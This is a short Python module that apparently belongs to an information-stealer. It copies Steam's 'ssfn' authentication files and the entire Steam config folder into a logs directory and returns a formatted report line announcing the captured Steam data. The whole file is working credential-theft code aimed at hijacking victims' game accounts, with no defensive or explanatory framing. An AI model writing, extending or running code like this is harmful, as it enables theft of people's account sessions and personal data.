from os import listdir
from os.path import join, isfile
from shutil import copytree,copy
from manager.logger import Log
from preferences.config import config



def Steam():
    main_path = "C:\\Program Files (x86)\\Steam"
    config_path = join(main_path, "config")
    dest_main = join(config.pathToLogs, "Games", "Steam")
    dest_config = join(dest_main, "config")

    try:
        msgInfo = "\n\n<b>🕹Games🕹</b>"
        Log("===========Games===========")
        auth_files = [item for item in listdir(main_path) if isfile(join(main_path, item)) and item.startswith("ssfn")]
        copytree(config_path, dest_config)
        for file in auth_files: copy(join(main_path, file), dest_main)
        msgInfo+="\n∟🎮Steam"
        return msgInfo
    except Exception as e: Log(f"Steam ---> {e}")
    return msgInfo